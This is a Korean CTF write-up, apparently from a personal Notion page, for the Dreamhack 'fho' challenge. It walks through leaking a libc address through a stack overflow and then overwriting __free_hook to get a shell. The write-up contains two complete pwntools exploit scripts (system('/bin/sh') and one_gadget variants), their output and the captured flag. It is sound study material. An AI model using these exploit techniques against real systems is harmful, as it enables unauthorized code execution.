https://teberr.notion.site/fho-d4977fd605e246beaa83939656e7a31e

# 문제 파일 다운로드

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a2bca908-cb9f-4e0c-9318-d7f5627d0b78/Untitled.png)

문제파일을 다운로드 받으면 fho.c 소스코드 파일과 basic_rop_x86파일 및 라이브러리를 획득할 수 있다. 

### 보호기법

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6be4838a-fe43-4b9e-9399-748cb969c377/Untitled.png)

fho 파일은 다음과 같이 보호기법이 적용되어있다.

- FULL RELRO - 라이브러리 함수들의 주소가 바이너리 로딩 시점에 모두 바인딩 되어 있어 got에 쓰기 권한이 제거되어 있다. 따라서 got overwrite를 할 수 없다.
- Stack - 카나리가 존재한다.
- NX - NX 비트가 존재하여 스택에 실행권한이 제거되어있다.
- PIE - 바이너리가 적재되는 주소가 랜덤화되어있다.

Partial RELRO → init / fini 위치에 쓰기권한이 제거되어 있어 두 영역을 덮어쓰기 힘들지만 .got.plt 영역에 대한 쓰기 권한이 존재하므로 GOT Overwrite 가능

FULL RELRO → .got.plt 영역에 대한 쓰기권한도 제거되어 있어 GOT OVERWRITE는 불가능함. 하지만 라이브러리의 hook은 덮어씌울 수 있음. 

PIE → PIE적용으로 인해 바이너리 즉 코드영역이 메모리에 적재되는 주소가 랜덤으로 되어있으므로 main 함수의 주소가 실행할 때마다 변경된다. 

# main함수가 실행 - 종료 되는 과정

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b513d390-4f3e-4eca-ab31-9640b90a2ea8/Untitled.png)

1. elf 파일의 entry point가 가리키는 _start()부터 호출하여 시작
2. _start()에서는 커널로부터 받은 argc,argv인자를 저장하고 스택을 초기화한 후 glibc내에 정의된 __libc_start_main()을 호출
3. __libc_start_main에서는 .init / .fini 섹션 작업과 관련된 함수들을 호출하고 메인함수를 호출 
4. main함수가 종료되면 __libc_start_main으로 돌아가 exit()를 실행시킨다. 이 때 main에서 써주는 return 0; 의 0을 exit()의 인자로 전달해준다.

# 코드분석 및 공격 설계

```c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

main함수는 세가지 부분으로 나뉘어진다.

1. 버퍼오버플로우가 발생하는 [1] 부분
2. 내가 원하는 주소에 원하는 값을 쓸 수 있는 [2] 부분
3. [2] 부분에서 쓴 내가 원하는 주소를 free 함수를 통해 할당 해제 해주는 부분 

이 파일은 ASLR이 적용되어 있어 라이브러리가 로드되는 주소값은 실행 될 때 마다 변경된다. 따라서 라이브러리의 오프셋을 통해서 내가 원하는 함수주소를 알아내야 하는데 이를 위해서는 main함수가 종료 된후 리턴되는 __libc_start_main_ret를 이용하여 알아낼 것이다. 

버퍼오버플로우를 통해 내가 원하는 main함수가 종료 된 후 리턴될 주소 알아내기 위해서는 얼마나 많은 값으로 덮어씌워야 하는지 알아보기 위해 gdb로 알아본다.

```python
gdb-peda$ pdisas main
Dump of assembler code for function main:
=> 0x00005555555548ba <+0>:     push   rbp
   0x00005555555548bb <+1>:     mov    rbp,rsp
   0x00005555555548be <+4>:     sub    rsp,0x50
   0x00005555555548c2 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x00005555555548cb <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00005555555548cf <+21>:    xor    eax,eax
   0x00005555555548d1 <+23>:    mov    rax,QWORD PTR [rip+0x200748]        # 0x555555755020 <stdin@@GLIBC_2.2.5>
   0x00005555555548d8 <+30>:    mov    ecx,0x0
   0x00005555555548dd <+35>:    mov    edx,0x2
   0x00005555555548e2 <+40>:    mov    esi,0x0
   0x00005555555548e7 <+45>:    mov    rdi,rax
   0x00005555555548ea <+48>:    call   0x555555554780 <setvbuf@plt>
   0x00005555555548ef <+53>:    mov    rax,QWORD PTR [rip+0x20071a]        # 0x555555755010 <stdout@@GLIBC_2.2.5>
   0x00005555555548f6 <+60>:    mov    ecx,0x0
   0x00005555555548fb <+65>:    mov    edx,0x2
   0x0000555555554900 <+70>:    mov    esi,0x0
   0x0000555555554905 <+75>:    mov    rdi,rax
   0x0000555555554908 <+78>:    call   0x555555554780 <setvbuf@plt>
   0x000055555555490d <+83>:    lea    rdi,[rip+0x1b0]        # 0x555555554ac4
   0x0000555555554914 <+90>:    call   0x555555554740 <puts@plt>
   0x0000555555554919 <+95>:    lea    rdi,[rip+0x1be]        # 0x555555554ade
   0x0000555555554920 <+102>:   mov    eax,0x0
   0x0000555555554925 <+107>:   call   0x555555554760 <printf@plt>
   0x000055555555492a <+112>:   lea    rax,[rbp-0x40]
   0x000055555555492e <+116>:   mov    edx,0x100
   0x0000555555554933 <+121>:   mov    rsi,rax
   0x0000555555554936 <+124>:   mov    edi,0x0
   0x000055555555493b <+129>:   call   0x555555554770 <read@plt>
   0x0000555555554940 <+134>:   lea    rax,[rbp-0x40]
   0x0000555555554944 <+138>:   mov    rsi,rax
   0x0000555555554947 <+141>:   lea    rdi,[rip+0x196]        # 0x555555554ae4
   0x000055555555494e <+148>:   mov    eax,0x0

canary 값
0x60b078f4ce6a7a00

gdb-peda$ x/40x 0x7fffffffdfa0
0x7fffffffdfa0: 0x6262626261616161      0x0000555555554a0a
0x7fffffffdfb0: 0x0000000000000000      0x0000555555554a40
0x7fffffffdfc0: 0x0000000000000000      0x00005555555547b0
0x7fffffffdfd0: 0x00007fffffffe0d0      0x60b078f4ce6a7a00 # ?? 카나리값
0x7fffffffdfe0: 0x0000000000000000      0x00007ffff7dfd81d #sfp  ret주소
0x7fffffffdff0: 0x00007fffffffe0d8      0x00000001f7fca000
```

사용자로 부터 입력을 받는 read 함수의 경우 rbp-0x40위치부터 입력을 받고 있고 카나리 값은 rbp-0x8에 존재한다. 그리고 우리가 알아내야 할 main 종료후 리턴될 __libc_start_main_ret 주소인 `0x00007ffff7dfd81d` 은 사용자의 입력을 받는 칸으로 부터 0x48만큼 덮어씌운 후 에 도달하는 것을 볼 수 있다. 이므로 이 값을 leak 하여 알아 낸 후 오프셋을 통하여 원하는 함수의 주소를 알아낼 것이다.

## 서버측의 라이브러리 버전 알아내기

이 문제에서는 라이브러리를 제공해 주고 있지만 예전 질문을 보면 라이브러리를 제공해 주지 않았던 문제로 보인다. 따라서 서버측의 라이브러리 버전을 알아내는 과정부터 진행하려고 한다. 

```python
from pwn import *

host="host3.dreamhack.games"
port=11211
p=remote(host,port)

e=ELF('./fho') # 파일 불러오기

payload =b'A'*0x48
p.sendafter("Buf: ", payload)
p.recvuntil(payload)
libc_start_main_ret = u64(p.recvline()[:-1]+b'\x00'*2)
print(hex(libc_start_main_ret))
```

위에서 알아냈던 __libc_start_main_ret의 주소를 버퍼오버플로우를 이용해서 알아내는 코드이다. 이를 실행하면 서버측에 있는 __libc_start_main_ret 주소가 나온다.

```python
┌──(root💀kali)-[~/바탕화면/fho(1)]
└─# python3 ./answer.py
[+] Opening connection to host3.dreamhack.games on port 17481: Done
[*] '/root/바탕화면/fho(1)/fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:812: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
0x7fbd43883bf7
[*] Closed connection to host3.dreamhack.games port 17481
```

0x7fbd43883bf7인데 ASLR의 특징은 하위 1.5바이트(bf7)은 오프셋으로 고정되어 있고 나머지 주소가 변경되는 특징을 가지고 있다. 따라서 이 하위 1.5바이트를 통해서 서버 측의 라이브러리를 알아낼 수 있다. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/646f9fed-1638-4abc-b8bf-91b597372917/Untitled.png)

[libc.rip](http://libc.rip) 에서 __libc_start_main_ret의 마지막 1.5바이트가 bf7인건 어떤 라이브러리인지 물어보면 된다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9c4cb0c9-33b3-456d-8431-964441d26f2f/Untitled.png)

그러면 위와 같이 사용하고 있는 라이브러리 버전이 libc6_2.27이며 이 라이브러리에서의 __libc_start_main_ret의 오프셋은 0x21bf7임을 알려준다.

이를 문제에서 준 라이브러리와 버전을 비교해보면 정확하게 libc_2.27.so로 똑같음을 확인할 수 있다. 

즉 유출한 __libc_start_main_ret의 주소에서 -0x21bf7을 하면 라이브러리의 base 주소를 알아낼 수 있다. 이 값과 offset을 통해서 원하는 함수를 실행시킬 수 있다.

공격은 두가지 방법이 존재하는데

1. 문제에서 제공한 것 처럼 특정 주소(addr)에 특정 값(value)를 덮어씌울 수 있으므로 이주소에 system 함수를 전달한 후 free의 인자로 “/bin/sh” 문자열이 담겨 있는 주소를 전달하여 system(”/bin/sh”)가 실행되도록 한다.
2. one_gadget의 오프셋을 사용하여 특정주소(addr)에 execve(”/bin/sh”)의 주소를 전달한다. 이렇게 하면 free의 인자로 아무값이나 보내도 execve(”/bin/sh”)가 실행되므로 “/bin/sh”문자열이 담겨있는 주소를 찾지 않아도 된다는 장점이 있다.

위에서 문자열 bin_sh가 라이브러리에 담겨있는 오프셋은 0x1b3e1a이므로 이 값을 라이브러리 베이스 주소에서 더하면 문자열 bin_sh이 담겨있는 주소가 된다.

# system(”/bin/sh”)를 실행시키는 풀이

현재 libc_base 주소를 알아내는 것까지 완료하였다. 

이제 이를 기반으로 system 함수의 주소, free_hook 함수의 주소, 문자열 “/bin/sh”이 담겨있는 주소를 구한다. 

이제 free가 실행될 때 free_hook에 핸들러가 있으면 먼저 실행시키게 되므로 free_hook 주소에 system 주소를 담아준 후 free의 인자로 문자열 /bin/sh가 담겨 있는 주소를 보내어 실행시키면 된다.

```python
#!/usr/bin/python3
from pwn import *

#context.log_level = 'debug'

host="host3.dreamhack.games"
port=11211
p=remote(host,port)

e=ELF('./fho') # 파일 불러오기
libc = ELF('./libc-2.27.so') # 라이브러리 불러오기

payload =b'A'*0x48
p.sendafter("Buf: ", payload)
p.recvuntil(payload)
libc_start_main_ret = u64(p.recvline()[:-1]+b'\x00'*2)
print(hex(libc_start_main_ret))
libc_base = libc_start_main_ret - 0x21bf7

system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
binsh = libc_base + 0x1b3e1a

p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(system))

p.recvuntil("To free: ")
p.sendline(str(binsh))

p.interactive()
```

이제 이 페이로드를 서버로 보내어 쉘 권한을 얻으면 된다.

```python
$ ls
fho
flag
run.sh
$ cat flag
DH{584ea800b3d6ff90857aa4300ba42218}
```

쉘을 얻었으므로 ls로 flag가 있는 것을 확인하고 flag 값을 

# one_gadget을 이용해 execve(”/bin/sh”)를 실행시키는 풀이

라이브러리를 알기 때문에 one_gadget을 이용해 execve(”/bin/sh”)가 담겨 있는 오프셋을 사용할 수 있다. 

```python
┌──(root💀kali)-[~/바탕화면/fho(1)]
└─# one_gadget libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

세 가지 주소가 나오는데 이 각 주소는 실행되려면 제약조건이 존재한다. 실행될 때 제약조건에 맞는 오프셋을 사용해야 된다.

```python
#!/usr/bin/python3
from pwn import *

#context.log_level = 'debug'

host="host3.dreamhack.games"
port=11211
p=remote(host,port)

e=ELF('./fho') # 파일 불러오기
libc = ELF('./libc-2.27.so') # 라이브러리 불러오기

payload =b'A'*0x48
p.sendafter("Buf: ", payload)
p.recvuntil(payload)
libc_start_main_ret = u64(p.recvline()[:-1]+b'\x00'*2)
print(hex(libc_start_main_ret))
libc_base = libc_start_main_ret - 0x21bf7

system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
one_gadget = libc_base + 0x4f432

p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(one_gadget))

p.recvuntil("To free: ")
p.sendline(str(0))

p.interactive()
```

이 때에는 free_hook에 전달해준 함수의 주소가 execve(”/bin/sh”)라서 free가 실행될 때 바로 execve(”/bin/sh”)가 실행되기 때문에 인자는 아무거나 전달해주면 된다.

```python
$ ls
fho
flag
run.sh
$ cat flag
DH{584ea800b3d6ff90857aa4300ba42218}
```

마찬가지로 쉘권한을 정상적으로 획득하여 flag값을 얻어낸 것을 확인할 수 있다.
